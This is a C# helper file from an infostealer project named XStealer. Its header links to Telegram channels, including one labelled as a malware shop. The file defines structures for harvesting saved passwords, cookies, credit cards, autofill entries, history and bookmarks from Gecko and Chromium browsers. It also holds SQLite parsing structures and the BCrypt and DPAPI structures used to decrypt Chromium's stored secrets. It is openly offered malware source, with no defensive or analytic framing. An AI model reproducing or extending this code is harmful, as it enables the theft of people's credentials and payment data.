// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer.Helpers
{
    using System;
    using System.Linq;
    using System.Runtime.InteropServices;

    public static class Structures
    {
        #region Sqlite data structure | Структура данных Sqlite

        [StructLayout(LayoutKind.Sequential)]
        public struct RecordHeaderField
        {
            public long Size; // Размер
            public long Type; // Тип поля
        }
        [StructLayout(LayoutKind.Sequential)]
        public struct TableEntry { public string[] Content; }
        [StructLayout(LayoutKind.Sequential)]
        public struct SqliteMasterEntry
        {
            public string ItemName; // Имя элемента 
            public long RootNum; // Корневой номер
            public string SqlStatement; // Sql Заявление
        }

        #endregion

        #region Gecko Browser Data Structures | Структуры данных для браузеров на движке Gecko

        [StructLayout(LayoutKind.Sequential)]
        public struct Password_Gecko
        {
            public string G_Url { get; set; } // Ссылка
            public string G_Username { get; set; } // Логин
            public string G_Pass { get; set; } // Пароль
            public string G_App { get; set; } // Имя браузера
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Cookies_Gecko
        {
            public string G_HostKey { get; set; } // Хост
            public string G_Name { get; set; } // Имя
            public string G_Path { get; set; } // Путь
            public string G_ExpiresUtc { get; set; } // Время
            public string G_Value { get; set; } // Значение
            public string G_IsSecure { get; set; } // Безопасность

            //public string G_IsHttpOnly { get; set; }
            //public string G_IsBrowserElement { get; set; }
            //public string G_SameSite { get; set; }
            //public string G_RawSameSite { get; set; } 
            //public string G_SchemeMap { get; set; }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Bookmark_Gecko
        {
            public string G_Title { get; set; } // Заголовок
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct History_Gecko
        {
            public string G_Url { get; set; } // Сcылка
            public string G_Title { get; set; } // Заголовок
            public string G_RevHost { get; set; } // Хост
        }

        #endregion

        #region Chromium Browser Data Structures | Структуры данных для браузеров на движке Chromium

        [StructLayout(LayoutKind.Sequential)]
        public struct Password_Chromium
        {
            public string C_Url { get; set; } // Ссылка
            public string C_Username { get; set; } // Логин
            public string C_Pass { get; set; } // Пароль
            public string C_BrowserName { get; set; } // Имя браузера
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Cookie_Chromium
        {
            public string C_HostKey { get; set; } // Хост
            public string C_Name { get; set; } // Имя
            public string C_Path { get; set; } // Путь
            public string C_ExpiresUtc { get; set; } // Время
            public string C_Key { get; set; } // Ключ
            public string C_Value { get; set; } // Значение
            public string C_IsSecure { get; set; } // Безопасность
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CreditCard_Chromium
        {
            public string C_Number { get; set; } // Номер карточки
            public string C_ExpYear { get; set; } // Год карточки
            public string C_ExpMonth { get; set; } // Месяц карточки
            public string C_Name { get; set; } // Имя карточки
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct AutoFill_Chromium
        {
            public string C_Name; // Имя
            public string C_Value; // Значение
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct History_Chromium
        {
            public string C_Url { get; set; } // Ссылка
            public string C_Title { get; set; } // Заголовок
            public int C_Count { get; set; } // Счётчик
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct Bookmark_Chromium
        {
            public string C_Url { get; set; } // Ссылка
            public string C_Title { get; set; } // Заголовок
        }

        #endregion

        #region BCrypt Chromium Browser Data Structures | BCrypt Структуры данных для браузеров на движке Chromium

        [StructLayout(LayoutKind.Sequential)]
        public ref struct BCRYPT_PSS_PADDING_INFO
        {
            public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
            {
                this.pszAlgId = pszAlgId; // ID
                this.cbSalt = cbSalt; // Соль
            }
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszAlgId;
            public int cbSalt;
        }

        [StructLayout(LayoutKind.Sequential)]
        public ref struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO
        {
            public int cbSize;
            public int dwInfoVersion;
            public IntPtr pbNonce;
            public int cbNonce;
            public IntPtr pbAuthData;
            public int cbAuthData;
            public IntPtr pbTag;
            public int cbTag;
            public IntPtr pbMacContext;
            public int cbMacContext;
            public int cbAAD;
            public long cbData;
            public int dwFlags;

            public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
            {
                dwInfoVersion = Modules.Browsers.Chromium.BCrypt.BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                if (iv != null)
                {
                    cbNonce = iv.Length;
                    pbNonce = Marshal.AllocHGlobal(cbNonce);
                    Marshal.Copy(iv, 0, pbNonce, cbNonce);
                }

                if (aad != null)
                {
                    cbAuthData = aad.Length;
                    pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                    Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
                }

                if (tag != null)
                {
                    cbTag = tag.Length;
                    pbTag = Marshal.AllocHGlobal(cbTag);
                    Marshal.Copy(tag, 0, pbTag, cbTag);

                    cbMacContext = tag.Length;
                    pbMacContext = Marshal.AllocHGlobal(cbMacContext);
                }
            }

            /// <summary>
            /// Метод освобождающий ресурсы
            /// </summary>
            internal void Free()
            {
                var memcrypt = new IntPtr[] { pbNonce, pbTag, pbAuthData, pbMacContext };
                foreach (IntPtr blobs in memcrypt.Where(blobs => blobs != IntPtr.Zero))
                {
                    Marshal.FreeHGlobal(blobs);
                }
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_KEY_LENGTHS_STRUCT
        {
            public int dwMinLength;
            public int dwMaxLength;
            public int dwIncrement;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BCRYPT_OAEP_PADDING_INFO
        {
            public BCRYPT_OAEP_PADDING_INFO(string alg)
            {
                pszAlgId = alg;
                pbLabel = IntPtr.Zero;
                cbLabel = 0;
            }
            [MarshalAs(UnmanagedType.LPWStr)]
            public string pszAlgId;
            public IntPtr pbLabel;
            public int cbLabel;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct CryptprotectPromptstruct
        {
            public int cbSize;
            public int dwPromptFlags;
            public IntPtr hwndApp;
            public string szPrompt;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct DataBlob
        {
            public int cbData;
            public IntPtr pbData;
        }

        #endregion
    }
}